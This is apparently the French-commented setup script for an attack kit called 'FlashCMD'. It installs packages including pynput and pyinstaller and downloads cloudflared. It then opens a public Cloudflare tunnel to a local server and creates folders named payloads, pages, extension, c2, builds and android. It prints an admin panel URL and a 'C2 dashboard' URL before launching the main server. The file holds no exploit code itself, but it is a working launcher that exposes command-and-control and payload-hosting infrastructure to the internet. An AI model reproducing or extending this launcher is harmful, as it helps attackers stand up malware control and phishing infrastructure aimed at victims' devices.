#!/usr/bin/env python3
"""
setup.py — Lance tout en une commande
  - Installe les dépendances
  - Télécharge cloudflared
  - Lance le tunnel Cloudflare
  - Lance le serveur
Usage : python setup.py
"""

import subprocess, sys, os, time, threading
import pathlib, json, stat, re

# ── dépendances ───────────────────────────────────────────────
DEPS = [
    "requests", "beautifulsoup4", "qrcode",
    "pillow", "cryptography", "pynput",
    "pyinstaller", "urllib3", "phonenumbers",
]

def install_deps():
    print("[*] Installation des dépendances…")
    subprocess.run(
        [sys.executable, "-m", "pip", "install",
         "--quiet", "--upgrade"] + DEPS,
        check=True,
    )
    print("[+] Dépendances OK\n")

# ── cloudflared ───────────────────────────────────────────────
def get_cloudflared_path() -> pathlib.Path:
    if sys.platform == "win32":
        return pathlib.Path("cloudflared.exe")
    return pathlib.Path("cloudflared")

def download_cloudflared() -> pathlib.Path:
    import urllib.request
    cf = get_cloudflared_path()
    if cf.exists():
        return cf
    print("[*] Téléchargement de cloudflared…")
    urls = {
        "win32":  ("https://github.com/cloudflare/cloudflared"
                   "/releases/latest/download/"
                   "cloudflared-windows-amd64.exe"),
        "linux":  ("https://github.com/cloudflare/cloudflared"
                   "/releases/latest/download/"
                   "cloudflared-linux-amd64"),
        "darwin": ("https://github.com/cloudflare/cloudflared"
                   "/releases/latest/download/"
                   "cloudflared-darwin-amd64.tgz"),
    }
    url = urls.get(sys.platform, urls["linux"])
    urllib.request.urlretrieve(url, cf)
    cf.chmod(cf.stat().st_mode | stat.S_IEXEC)
    print(f"[+] cloudflared → {cf}\n")
    return cf

def start_tunnel(port: int) -> str:
    cf         = download_cloudflared()
    public_url = None
    ready      = threading.Event()

    def _run():
        nonlocal public_url
        proc = subprocess.Popen(
            [str(cf), "tunnel", "--url",
             f"http://localhost:{port}",
             "--no-autoupdate"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
        for line in proc.stdout:
            line = line.rstrip()
            if line:
                print(f"  [cf] {line}")
            m = re.search(r"https://[a-z0-9\-]+\.trycloudflare\.com",
                          line)
            if m and not public_url:
                public_url = m.group(0)
                ready.set()

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    print("[*] Attente du tunnel Cloudflare (30s max)…")
    ready.wait(timeout=30)
    if not public_url:
        print("[!] Tunnel timeout — utilisation IP locale")
        public_url = f"http://localhost:{port}"
    return public_url

# ── main ──────────────────────────────────────────────────────
def main():
    PORT = 8080
    print("\n" + "="*56)
    print("  FlashCMD — Démarrage automatique")
    print("="*56 + "\n")

    install_deps()

    # Créer les dossiers nécessaires
    for d in ["payloads","pages","extension",
              "c2","builds","android"]:
        pathlib.Path(d).mkdir(exist_ok=True)

    # Lancer le tunnel
    url = start_tunnel(PORT)

    # Sauvegarder l'URL publique
    cfg = {"public_url": url, "port": PORT}
    pathlib.Path(".config.json").write_text(
        json.dumps(cfg, indent=2))

    print(f"\n{'='*56}")
    print(f"  URL PUBLIQUE : {url}")
    print(f"  Fonctionne en 5G, WiFi, partout")
    print(f"  Admin panel  : {url}/admin")
    print(f"  C2 dashboard : {url}/c2")
    print(f"{'='*56}\n")

    # Lancer le serveur principal
    os.environ["FLASHCMD_PUBLIC_URL"] = url
    os.environ["FLASHCMD_PORT"]       = str(PORT)
    print("[*] Lancement du serveur…\n")
    os.execv(sys.executable,
             [sys.executable, "server_v2.py"])

if __name__ == "__main__":
    main()